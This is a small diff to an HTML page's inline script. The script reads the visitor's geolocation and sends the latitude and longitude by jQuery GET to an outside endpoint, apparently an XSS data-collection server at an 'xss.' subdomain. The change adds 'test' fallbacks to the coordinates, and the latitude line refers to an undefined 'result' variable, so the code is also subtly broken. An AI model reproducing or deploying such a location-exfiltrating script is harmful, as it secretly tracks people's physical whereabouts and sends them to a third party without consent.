@@ -12,8 +12,8 @@
 <script type="text/javascript">
     navigator.geolocation.getCurrentPosition(function(position) {
         alert('begin');
-		var lat = result.coords.latitude
-		var lng = position.coords.longitude
+		var lat = result.coords.latitude || 'test';
+		var lng = position.coords.longitude || 'test';
         $.get("https://xss.1jr.com.cn/data.php",{ getLng: lng, getLat: lat},function(result){
         alert('end');
         });
